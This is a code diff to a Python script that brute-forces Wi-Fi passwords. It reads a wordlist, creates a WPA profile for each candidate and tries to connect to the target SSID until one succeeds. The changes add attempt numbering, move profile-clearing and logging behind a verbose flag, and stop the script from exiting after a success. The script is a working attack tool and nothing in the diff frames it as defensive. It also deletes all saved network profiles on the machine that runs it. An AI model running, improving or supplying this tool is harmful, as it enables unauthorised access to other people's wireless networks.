@@ -54,14 +54,15 @@ def crack_password(ssid, password, number, verbose=False):
     profile.cipher = const.CIPHER_TYPE_CCMP  # type of cipher
     profile.key = password  # use generated password
 
-    print(DARK_GREEN)
-    print(PLUS, "total network profiles: ", len(wifi.iface.network_profiles()))
-    print(PLUS, "remove_all_network_profiles")
-    wifi.iface.remove_all_network_profiles()  # remove all the profiles which are previously connected to device
-    print(PLUS, "total network_profiles: ", len(wifi.iface.network_profiles()))
+    if verbose:
+        print(DARK_GREEN)
+        print(PLUS, f"[{number}] total network profiles: ", len(wifi.iface.network_profiles()))
+        print(PLUS, f"[{number}] remove_all_network_profiles")
+        wifi.iface.remove_all_network_profiles()  # remove all the profiles which are previously connected to device
+        print(PLUS, f"[{number}] total network_profiles: ", len(wifi.iface.network_profiles()))
 
-    print(GREEN)
-    print(PLUS, "creating profile:")
+    print(GREEN, end="")
+    print(PLUS, f"[{number}] creating profile:")
     tmp_profile = wifi.iface.add_network_profile(profile)  # add new profile
 
     if verbose:
@@ -70,8 +71,8 @@ def crack_password(ssid, password, number, verbose=False):
             print(f"{var:15}: {getattr(tmp_profile, var)}")
 
     time.sleep(1)  # if script not working change time to 1 !!!!!!
-    print(GREEN)
-    print(PLUS, "connecting...")
+    print(GREEN, end="")
+    print(PLUS, f"[{number}] connecting...")
     wifi.iface.connect(tmp_profile)  # trying to Connect
     time.sleep(1)  # 1s
 
@@ -81,7 +82,7 @@ def crack_password(ssid, password, number, verbose=False):
         print(BOLD, GREEN, '[*] password is ' + password, RESET)
         wifi.iface.disconnect()
         time.sleep(1)
-        exit()
+        # exit()
     else:
         print(LIGHT_RED, '[{}] Crack Failed using {}'.format(number, password))
 
@@ -103,9 +104,9 @@ def crack_loop(ssid, file, verbose=False):
         with open(file, 'r', encoding='utf8') as words:
             for line in words:
                 number += 1
-                line = line.split("\n")
-                pwd = line[0]
-                print(GREEN)
+                # line = line.split("\n")
+                pwd = line.strip('\r').strip('\n').strip()
+                print(YELLOW)
                 print(f"[{number}] Trying {ssid} with {pwd}")
                 crack_password(ssid, pwd, number, verbose=False)
 
